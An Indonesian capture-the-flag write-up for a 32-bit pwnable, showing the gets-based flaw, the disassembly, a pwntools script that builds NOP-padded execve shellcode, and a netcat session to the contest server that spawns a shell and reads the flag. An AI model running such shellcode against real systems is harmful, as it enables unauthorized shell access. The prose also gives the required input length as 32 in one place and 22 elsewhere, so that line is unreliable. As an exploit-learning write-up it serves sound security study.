@@ -1,0 +1,83 @@
+
+
+~ Gimme Something ~ Pwnable ~ SlashRootCTF (100pts)
+
+
+Kali ini soal pwnable berjudul "gimme_something", yang diberikan sebuah
+elf 32bit, yang meminta sebuah input. program menggunakan fungsi gets yang tidak
+aman dan menyebabkan buffer overflow, dan ternyata setelah menerima input, panjang
+input akan dicek, jika panjangnya adalah 32, maka program akan loncat ke alamat
+input kita. Nantinya input kita akan berisi shellcode yg mempunyai 22byte yang
+nantinya shellcode kita akan memberi akses kepada kita untuk masuk ke sistem
+
+Bagian program inilah, intruksi program loncat ke alamat input (shellcode) kita
+
+            +------------------------------+
+            | lea     eax, [ebp+s]         |
+            | mov     [esp], eax      ; s  |
+            | call    _gets                |    // gets
+            | lea     eax, [ebp+s]         |
+            | mov     [esp], eax      ; s  |
+            | call    _strlen              |    // strlen
+            | cmp     eax, 16h             | 
+            | jz      short loc_804852E    |   // if strlen(s) == 22 ??
+            +------------------------------+
+           F  |`---.                                +-----------------------+
+           A  |     `-----------------------------> |  loc_804852E:         |
+         | L  |            TRUE ->                  | lea     eax, [ebp+s]  | // memanggil
+         V S  |                                     | call    eax           | // input (shellcode)
+           E  V                                     +-----------------------+ 
++-------------------------------------------------+
+| mov     dword ptr [esp], offset aWhatDoYouWantD |
+| call    _puts                                   |
+| mov     eax, ds:stdout@@GLIBC_2_0               |
+| mov     [esp], eax      ; stream                |
+| call    _fflush                                 |
+| jmp     short locret_8048533                    |
++-------------------------------------------------+
+
+Panjang shellcode harus 22, setelah search di google saya menemukan shellcode yang mempunyai
+panjang 19byte, dan ditambah nop agar panjang menjadi 22. saya membuat script python untuk
+mengenerate payloadnya
+
++--------------------------------------------------------------------------------+
+| ramdhan@n0psledbyt3:~/slashroot$ cat ex.py 
+| import struct
+| from pwn import asm
+| sh = """
+| xor ecx,ecx
+| push ecx
+| push 0x68732f6e
+| push 0x69622f2f
+| lea eax,[ecx+0xB]
+| mov ebx,esp
+| int 0x80
+| """
+| 
+| shell = asm(sh)
+| nop = "\x90"*(22-len(shell))
+| payload = nop+shell
+| print payload 
+| ramdhan@n0psledbyt3:~/slashroot$ (python ex.py; cat -) | nc 103.200.7.150 7777
+| [x] Welcome to #SlashRootCTF2K17 [x]
+| Glad to see you here, enjoy the CTF \m/...
+| ls -an
+| total 52
+| drwxr-x--- 17 0 1000 4096 Jun  9 09:40 .
+| drwxr-x--- 17 0 1000 4096 Jun  9 09:40 ..
+| -rwxr-x---  1 0 1000  220 Aug 31  2015 .bash_logout
+| -rwxr-x---  1 0 1000 3771 Aug 31  2015 .bashrc
+| -rwxr-----  1 0 1000   36 Jun  9 09:29 .flag
+| -rwxr-x---  1 0 1000  655 Jun 24  2016 .profile
+| drwxr-xr-x  2 0    0 4096 Jun  9 09:40 bin
+| drwxr-xr-x  2 0    0 4096 Jun  9 09:40 dev
+| -rwxr-x---  1 0 1000 7471 Jun  9 09:29 gimme_shell
+| drwxr-xr-x 32 0    0 4096 Jun  9 09:40 lib
+| drwxr-xr-x  3 0    0 4096 Jun  9 09:40 lib32
+| drwxr-xr-x  2 0    0 4096 Jun  9 09:40 lib64
+| cat .flag
+| SlashRootCTF{stairway_to_sHELLcode}
++------------------------------------------------------------------------------------+
+
+Flag : SlashRootCTF{stairway_to_sHELLcode}
+
